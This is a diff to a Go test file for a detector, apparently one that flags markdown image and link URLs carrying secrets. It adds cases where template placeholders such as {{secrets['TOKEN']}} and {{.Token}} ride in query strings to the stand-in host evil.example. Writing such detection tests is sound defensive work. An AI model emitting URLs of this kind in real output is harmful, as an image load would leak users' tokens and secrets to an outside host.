@@ -63,6 +63,11 @@ func TestDataCarryingURLs(t *testing.T) {
 		// Placeholder forms still count, encoded or not.
 		"image placeholder": "![x](https://evil.example/p.png?v=YOUR_API_KEY)",
 		"link encoded":      "[click](https://evil.example/?x=%7B%7Bsecrets.TOKEN%7D%7D)",
+		// Template expressions that are not plain identifiers still count.
+		"index template":   "![x](https://evil.example/p.png?q={{secrets['TOKEN']}})",
+		"dot template":     "![x](https://evil.example/p.png?q={{.Token}})",
+		"var template":     "![x](https://evil.example/p.png?q={{$secret}})",
+		"key dot template": "![x](https://evil.example/p.png?{{.Token}}=1)",
 		// A signing key name without its scheme's signature parameter is not
 		// exempt, and prose under a signing key is not token-shaped.
 		"unsigned sig key": "![x](https://evil.example/p.png?X-Amz-Date=c2VjcmV0LXRva2VuLXZhbHVlLWhlcmU)",
